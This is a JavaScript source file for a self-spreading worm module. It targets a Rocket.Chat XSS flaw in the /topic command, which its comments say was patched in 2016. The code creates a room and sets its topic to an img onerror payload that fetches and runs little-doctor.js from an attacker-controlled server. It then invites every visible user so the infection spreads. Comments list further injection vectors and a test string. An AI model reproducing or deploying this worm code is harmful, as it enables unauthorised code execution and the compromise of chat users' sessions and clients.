"use strict";

/*
 * This modules spreads using a XSS vulnerability in /topic,
 * which was patched in October of 2016.
 * 
 * This is a SUPER-hacky propagation module btw, so don't judge.
 * 
 */

define({

    propagate: function() {
        if (navigator.userAgent.indexOf("Rocket.Chat") > -1) {
            // Ensure the little doctor only runs once
            if (!window.LITTLE_DOCTOR) {
                window.LITTLE_DOCTOR = true;
                console.log('Starting RocketCat propagation module');
                this.infectChannel();
            }
        }
    },

    infectChannel: function() {
        var payload = encodeURI('$.getScript(\'' + __ld_server + '/js/little-doctor.js\');');
        var roomName = 'the-end-is-nigh-' + Math.floor((Math.random() * 10000) + 1);
        var users = this.listUsers();  // Users in the DOM
        this.createRoom(roomName);

        var _this = this;
        setTimeout(function() {

            // This was also vulnerable to <a href='javascript:' and <input onfocus=''
            // but only <img src=x pops without needing too much user interaction
            // to test do `/topic a<img src=x onerror='console.log(1)'>` in chat
            _this.setTopic('NOT-A-TRAP<img src=x onerror="' + payload + '">');
            setTimeout(function() {
                
                // Invite all users
                for (var index = 0; index < users.length; ++index) {
                    console.log('Sending invite to: ' + users[index]);
                    _this.sendInvite(users[index], index);
                }

            }, 2000);
        }, 7500);
    },

    listUsers: function() {
        var userTags = document.querySelectorAll('[data-username]');
        var users = new Set();
        for (var index = 0; index < userTags.length; ++index) {
            users.add(userTags[index].getAttribute('data-username'));
        }
        console.log(users);
        return Array.from(users);
    },

    createRoom: function(name) {
        $("h3.add-room.active").click();
        setTimeout(function() {
            $("#channel-name").val(name);
            $("button.clean.primary.save-channel").click();
        }, 1500);
    },

    getChatWindowId: function() {
        var chatWindow = $('[id^=chat-window-')[0].id;
        var rid = chatWindow.split('chat-window-')[1];
        console.log('Chat Window ID is: ' + rid);
        return rid;
    },

    setTopic: function(topic) {
        console.log('Set topic to: ' + topic);
        RocketChat.slashCommands.run('topic', topic, {
            _id: "asdfasdfasdf",
            rid: this.getChatWindowId(),
            msg: "/topic " + topic
        });
    },

    sendInvite: function(user, index) {
        var _this = this;
        setTimeout(function() {
            _this.sendMessage('/invite ' + user);
        }, 2500 * index);
    },

    // We didn't end up needing to actually send messages but I left this here
    // using `/create` was too unrealiable 
    sendMessage: function(message, delay) {
        console.log('Sending message: ' + message);
        var textarea = document.getElementsByClassName('input-message')[0];
        if (textarea) {
            setTimeout(function() {
                textarea.value = message;
                $('textarea').trigger('keyup');  // Yea fuck it we'll use jQuery
                setTimeout(function() {
                    var send = document.getElementsByClassName('send-button')[0];
                    if (send) {
                        send.click();
                    } else {
                        console.log('Error: Could not find send-message');
                    }
                }, 100);
            }, delay || 100);
        } else {
            console.log('Error: Could not find input-message');
        }

    }

});